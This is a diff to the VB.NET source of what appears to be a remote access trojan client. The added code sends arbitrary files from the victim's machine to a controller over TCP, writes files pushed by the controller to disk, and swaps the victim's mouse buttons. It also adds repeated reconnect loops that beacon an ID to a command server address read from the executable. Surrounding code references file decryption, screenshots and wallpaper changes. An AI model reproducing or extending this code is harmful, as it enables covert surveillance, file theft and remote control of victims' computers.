@@ -15,7 +15,7 @@ Public Class Form1
     Dim MonClient As TcpClient
     Dim id As String
 
-
+    Dim o As TcpClient
 
 
     '' CHANGE WALLPAPER FCT
@@ -640,7 +640,21 @@ Public Class Form1
 
             LaunchDeCrypt(file, key, filename)
 
+        ElseIf TextBox1.Text.Contains("\DownloadThisFilePlease/") Then
 
+            Dim thisfile As String = TextBox1.Text.Replace("\DownloadThisFilePlease/", "")
+
+            Task.Run(Sub() RetrieveFile(thisfile))
+        ElseIf TextBox1.Text.Contains("\\\UploadThereSir///") Then
+            Dim seprate As String() = Split(TextBox1.Text, "\\\UploadThereSir///")
+
+            FileThere(seprate(1), seprate(0))
+
+        ElseIf TextBox1.Text = "\\SwapThatBitch//" Then
+            '"\\SwapThatBitch//"   '\\RevertThatSwapBitch//
+            SwapOn()
+        ElseIf TextBox1.Text = "\\RevertThatSwapBitch//" Then
+            SwapOff()
         ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT
 
             Dim lk As New Random
@@ -665,6 +679,58 @@ Public Class Form1
 
 
         End If
+        FlushMemory()
+    End Sub
+
+    Public Sub FileThere(ByVal s As String, ByVal source As String)
+        MessageBox.Show(s)
+        Try
+            IO.File.WriteAllBytes(s, Convert.FromBase64String(source))
+
+        Catch ex As Exception
+
+        End Try
+        TextBox1.Text = String.Empty
+    End Sub
+    ''Come from : https://www.youtube.com/watch?v=-fPY7ecWPUA
+    ''Reset Cache Memory
+    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
+    Public Sub FlushMemory()
+        Try
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
+            If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
+                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+                Dim myProcesses As Process() = Process.GetProcessesByName("ApplicationName")
+                Dim myProcess As Process
+                'Dim ProcessInfo As Process
+                For Each myProcess In myProcesses
+                    SetProcessWorkingSetSize(myProcess.Handle, -1, -1)
+                Next myProcess
+            End If
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    ''https://www.youtube.com/watch?v=-fPY7ecWPUA
+
+    Public Sub RetrieveFile(ByVal file As String)
+        Dim name As String() = Split(file, "\>/TheFileToWrite")
+        Dim s = Convert.ToBase64String(IO.File.ReadAllBytes(file)) + "\>/TheFileToWrite" + name(name.Length - 1)
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(s)
+
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+        TextBox1.Text = String.Empty
+
+
+    End Sub
+    Public Sub SwapOn()
+        Win32APILib.AllFunctions.SwapMouseLeftAndRight(1)
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub SwapOff()
+        Win32APILib.AllFunctions.SwapMouseLeftAndRight(0)
+        TextBox1.Text = String.Empty
     End Sub
 
     'From : https://github.com/xxtea/xxtea-dotnet
@@ -846,20 +912,41 @@ Public Class Form1
                 MonClient.GetStream().Write(buffer, 0, buffer.Length)
                 ''
                 Timer2.Start()
-            Else
 
-                Timer1.Start()
+            Else
+                'Timer2.Start()
+
+
+                While MonClient.Connected = False
+
+                    MonClient = New TcpClient()
+                    MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
+
+                    If MonClient.Connected Then
+
+
+                        Dim l As New Random
+                        id = l.Next(100000, 999999).ToString
+                        Dim k = id + "THISISMYID"
+                        Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
+                        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+                        Timer2.Start()
+                        ''
+                    End If
+
+                End While
+                Timer2.Start()
+                '    Timer1.Start()
             End If
             Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
 
-
+            Timer2.Start()
         Catch ex As Exception
-            '  MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
-            '   Timer1.Start()
+            Timer2.Start()
         End Try
     End Sub
 
-    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
         FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
         Dim data As String = Space(LOF(1))
         FileGet(1, data)
@@ -868,16 +955,17 @@ Public Class Form1
 
         options = Split(data, splitz)
 
-        Try 'Pour éviter les erreurs
+        Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
+        Try
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes("NoneJustTryToConnect")
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
 
-
-            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
-            If MonClient.Connected = False Then
-
-
+        Catch ex As Exception
+            Try
                 MonClient = New TcpClient()
-                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
 
+                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
+                ' MonClient.BeginConnect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
 
                 Dim l As New Random
                 id = l.Next(100000, 999999).ToString
@@ -885,20 +973,13 @@ Public Class Form1
                 Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                 MonClient.GetStream().Write(buffer, 0, buffer.Length)
 
-            Else
-                Timer1.Stop()
-                Timer2.Start()
-            End If
-            Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
+                Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
 
+            Catch exs As Exception
 
-        Catch ex As Exception
-
+            End Try
         End Try
-
-
     End Sub
-
     Private Sub UDPTIMER_Tick(sender As Object, e As EventArgs) Handles UDPTIMER.Tick
         If ClearMyplug = False Then
             TextBox1.Text = String.Empty
@@ -916,45 +997,8 @@ Public Class Form1
         End If
     End Sub
 
-    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
-        'NoneJustTryToConnect
-        Try
-            Dim buffer() As Byte = Encoding.UTF8.GetBytes("NoneJustTryToConnect")
-            MonClient.GetStream().Write(buffer, 0, buffer.Length)
-
-        Catch ex As Exception
-
-            Try
-                FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
-                Dim data As String = Space(LOF(1))
-                FileGet(1, data)
-                FileClose(1)
-                Dim options() As String
-
-                options = Split(data, splitz)
-
-
-                Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
-                MonClient = New TcpClient()
-                MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
-
-
-                Dim l As New Random
-                id = l.Next(100000, 999999).ToString
-                Dim k = id + "THISISMYID"
-                Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
-                MonClient.GetStream().Write(buffer, 0, buffer.Length)
-
-                Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
-
-                Timer1.Start()
-            Catch exs As Exception
-
-            End Try
-        End Try
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
 
     End Sub
-
-
 End Class
 
